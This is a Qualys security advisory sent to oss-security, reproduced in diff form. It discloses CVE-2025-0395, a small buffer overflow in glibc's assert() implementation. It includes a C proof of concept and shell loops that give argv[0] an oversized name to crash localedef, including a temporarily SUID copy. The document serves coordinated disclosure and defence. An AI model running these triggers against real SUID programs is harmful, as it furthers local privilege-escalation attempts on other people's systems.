@@ -1,0 +1,231 @@
+
+Message-ID: <20250122134128.GA29327@localhost.localdomain>
+Date: Wed, 22 Jan 2025 13:41:36 +0000
+From: Qualys Security Advisory <qsa@...lys.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE-2025-0395: Buffer overflow in the GNU C Library's assert()
+
+Hi all,
+
+On January 10, 2025, we contacted the GNU C Library's security team
+about a buffer overflow that we discovered in assert()'s implementation
+(CVE-2025-0395). Because this vulnerability seems relatively minor (for
+reasons detailed below), it was decided that it could be discussed and
+patched publicly, without an embargo.
+
+Today (January 22, 2025) a Bugzilla entry and a patch proposal for this
+vulnerability have been published:
+
+  https://sourceware.org/bugzilla/show_bug.cgi?id=32582
+  https://patchwork.sourceware.org/project/glibc/list/?series=43300
+  https://sourceware.org/pipermail/libc-alpha/2025-January/164164.html
+  https://sourceware.org/pipermail/libc-alpha/2025-January/164165.html
+  https://sourceware.org/pipermail/libc-alpha/2025-January/164166.html
+
+For more details and a proof of concept, below are the two emails that
+we sent to the GNU C Library's security team. We are of course at your
+disposal for questions, comments, and further discussions. Thank you
+very much!
+
+With best regards,
+-- the Qualys Security Advisory team
+
+========================================================================
+
+While looking into commit 6f0ea84 ("assert: Remove the use of %n from
+__assert_fail_base (BZ #32456)"), we spotted an mmap-based buffer
+overflow in assert() (more precisely, in __assert_fail_base()),
+introduced in 2011 by commit f8a3b5b ("Use mmap for allocation of
+buffers used for __abort_msg"):
+
+------------------------------------------------------------------------
+356 struct abort_msg_s
+357 {
+358   unsigned int size;
+359   char msg[0];
+360 };
+------------------------------------------------------------------------
+ 68       total = (total + 1 + GLRO(dl_pagesize) - 1) & ~(GLRO(dl_pagesize) - 1);
+ 69       struct abort_msg_s *buf = __mmap (NULL, total, PROT_READ | PROT_WRITE,
+ 70                                         MAP_ANON | MAP_PRIVATE, -1, 0);
+ 71       if (__glibc_likely (buf != MAP_FAILED))
+ 72         {
+ 73           buf->size = total;
+ 74           strcpy (buf->msg, str);
+------------------------------------------------------------------------
+
+- at lines 68-70, a buffer buf is mmap()ed for a copy of the string str
+  and its terminating null byte (total + 1 bytes), plus possible padding
+  (to a multiple of the page size);
+
+- but at line 73, an extra, unaccounted-for unsigned int (size) is also
+  written into this mmap()ed buf;
+
+- so at line 74, the strcpy() overflows buf with the last bytes of str
+  (an off-by-one, two, three, or four bytes (the sizeof unsigned int),
+  depending on the padding size).
+
+Because the string str includes __progname (the basename() of argv[0]),
+a local attacker can ensure that the padding at line 68 is minimal and
+can overflow the buffer buf at line 74 (and this works even against a
+SUID program that contains an assertion failure). Exploitation of this
+vulnerability looks difficult, but cannot be ruled out completely:
+
+- a SUID program that contains a reachable assertion failure is needed;
+
+- the buffer overflow is mmap-based, and at most an off-by-four bytes;
+
+- the attacker does not control the four bytes that overflow the buffer;
+
+- the program is about to die (assert() calls abort(), eventually).
+
+Important note: __libc_message_impl() in sysdeps/posix/libc_fatal.c is
+also vulnerable to a very similar buffer overflow.
+
+To validate our findings, we first used the following proof of concept:
+
+------------------------------------------------------------------------
+$ cat > poc.c << "EOF"
+#include <assert.h>
+int
+main(const int argc, const char * const argv[])
+{
+    assert(argc < 3);
+    return 0;
+}
+EOF
+
+$ gcc -o poc poc.c
+
+$ ./poc one two
+poc: poc.c:5: main: Assertion `argc < 3' failed.
+Aborted
+
+$ wc << "EOF"
+: poc.c:5: main: Assertion `argc < 3' failed.
+EOF
+      1       8      46
+
+$ while true; do
+    P="$(((1 + RANDOM % 32) * 4096))"
+    L="$((P - (46 + 1)))"
+    A="$(perl -e "print 'a' x $L")"
+    (exec -a "$A" ./poc one two 2>/dev/null)
+    if test "$?" -ne "$((128 + 6))"; then
+        echo "$L"
+        break
+    fi
+done
+
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Segmentation fault
+94161
+------------------------------------------------------------------------
+
+Next, to validate these findings in a more realistic scenario, we
+searched for an assertion failure in one of the programs that are
+installed by default on Linux; we found one in localedef, which is not
+SUID but is part of the glibc itself ("./fi_FI", which is attached to
+this email, is a modified version of the example in "man localedef"):
+
+------------------------------------------------------------------------
+$ /usr/bin/localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8
+[warning] No definition for LC_CTYPE category found
+[warning] No definition for LC_NUMERIC category found
+[warning] No definition for LC_TIME category found
+localedef: programs/ld-collate.c:1886: collate_finish: Assertion `ruleidx <= 128' failed.
+Aborted
+
+$ wc << "EOF"
+: programs/ld-collate.c:1886: collate_finish: Assertion `ruleidx <= 128' failed.
+EOF
+      1       8      81
+
+$ while true; do
+    P="$(((1 + RANDOM % 32) * 4096))"
+    L="$((P - (81 + 1)))"
+    A="$(perl -e "print 'a' x $L")"
+    (exec -a "$A" localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8 2>/dev/null)
+    if test "$?" -ne "$((128 + 6))"; then
+        echo "$L"
+        break
+    fi
+done
+
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Segmentation fault
+85934
+------------------------------------------------------------------------
+
+Last, to double-check that this attack also works even against a SUID
+program, we temporarily set the SUID bit of localedef:
+
+------------------------------------------------------------------------
+# chmod u+s /usr/bin/localedef
+------------------------------------------------------------------------
+$ while true; do
+    P="$(((1 + RANDOM % 32) * 4096))"
+    L="$((P - (81 + 1)))"
+    A="$(perl -e "print 'a' x $L")"
+    (exec -a "$A" localedef -f UTF-8 -i ./fi_FI ./fi_FI.UTF-8 2>/dev/null)
+    if test "$?" -ne "$((128 + 6))"; then
+        echo "$L"
+        break
+    fi
+done
+
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Aborted
+Segmentation fault
+44974
+------------------------------------------------------------------------
+# chmod u-s /usr/bin/localedef
+------------------------------------------------------------------------
+
+As we are currently working on several other projects in parallel, we
+have not tried to find a real-world vulnerable SUID program.
+
+========================================================================
+
+Just a quick update:
+
+On Fri, Jan 10, 2025 at 11:01:12PM +0000, Qualys Security Advisory wrote:
+> Important note: __libc_message_impl() in sysdeps/posix/libc_fatal.c is
+> also vulnerable to a very similar buffer overflow.
+
+Although __libc_message() is in theory vulnerable to the same buffer
+overflow as assert(), we double-checked and __libc_message()'s callers
+(__libc_fatal(), __fortify_fail(), malloc_printerr(), and assert()s that
+are internal to the glibc) never include attacker-controlled or long-
+enough strings to trigger this buffer overflow in practice (it should
+probably still be fixed, however).
+
+So only assert() calls that come from outside the glibc are vulnerable
+to this buffer overflow (because __progname is attacker-controlled).
+
+
+View attachment "fi_FI" of type "text/plain" (14759 bytes)
